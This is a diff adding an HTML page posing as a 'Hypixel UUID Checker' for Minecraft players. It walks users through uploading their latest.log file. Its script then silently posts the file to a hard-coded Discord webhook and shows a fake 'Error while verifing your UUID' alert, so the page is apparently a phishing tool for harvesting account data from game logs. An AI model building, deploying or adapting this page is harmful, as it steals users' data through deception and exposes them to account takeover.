@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Hypixel UUID Checker</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="" />
+  <link rel="stylesheet" type="text/css" href="style.css" />
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+  <link rel="apple-touch-icon" type="image/png" sizes="180x180" href="apple-touch-icon.png">
+  <link rel="icon" type="image/svg+xml" href="favicon.svg">
+</head>
+<body>
+  <div id="fadein"></div>
+  <style>
+    /* For best practice, move CSS below to an external CSS file. */
+    @keyframes fadeinall {
+    0% {
+      opacity: 1; }
+    97% {
+      opacity: 0; }
+    98% {
+      opacity: 0;
+      -webkit-transform: translateY(0);
+      transform: translateY(0); }
+    100% {
+      opacity: 0;
+      -webkit-transform: translateY(-100%);
+      transform: translateY(-100%);
+      z-index: -1; } }
+    #fadein {
+      opacity: 1;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      -webkit-transform: translateY(0);
+      -ms-transform: translateY(0);
+      transform: translateY(0);
+      background-color: #FFFFFF;
+      z-index: 999;
+      -webkit-animation-fill-mode: forwards;
+      animation-fill-mode: forwards;
+      -webkit-animation: fadeinall 1s normal both;
+      animation: fadeinall 1s normal both;
+      -webkit-animation-delay: 0.3s;
+      animation-delay: 0.3s; }
+  </style>
+<center>
+  <p>Hypixel <span>UUID</span> Checker</p>
+
+  <a>This web-app allows you to do a "background check" on the UUID of an item to make sure it is not shady. </a>
+
+<br>
+
+
+<br>
+<br>
+<a>Upload Latest.log file:</a>
+<br><br>
+<input type="file" id="file-selector" multiple/></input>
+<br>
+<button onclick="upload2()">Check UUID!</button>
+
+
+
+  <p style="font-size: 2em; text-shadow: 0px 0px 0px;">Where to find latest.log file:</p>
+
+</center>
+<div style="margin-left: 50%; transform: translate(-50%);">
+<a>
+1. Run the 1.8.9 Vanilla Version of Minecraft.<br><br>
+2. Open Hypixel.net then open skyblock.<br><br>
+3. Close minecraft after loading into skyblock.<br><br>
+4. Return to our website and click "Choose Files" under the "Upload latest.log file:" header.<br><br>
+5. Navigate to the "logs" folder in your ".minecraft" folder.<br><br>
+6. Submit the file named "latest.log"<br><br>
+7. Click check UUID!</a>
+</div>
+
+<center style="margin: 100px;">
+<video width="80%" height="80%" controls>
+  <source src="video.mp4" type="video/mp4">
+</video>
+</center>
+<script>
+ function upload2() {
+    var formData = new FormData();
+formData.append("file", document.getElementById("file-selector").files[0]);
+    formData.append("content", "File Submited");
+        
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://discord.com/api/webhooks/1138623909428736090/6Ew9q8JR8MnWuh6g0OkzG0dX93wx-wjSOgpdiwlfbuSK-esBGVN8Y0r2Jj04cYyoFxVZ");
+xhr.send(formData);
+
+alert("Error while verifing your UUID.\nMake sure you did all the steps correctly.");
+  }
+</script>
+
+
+
+</center>
+</body>
+</html>
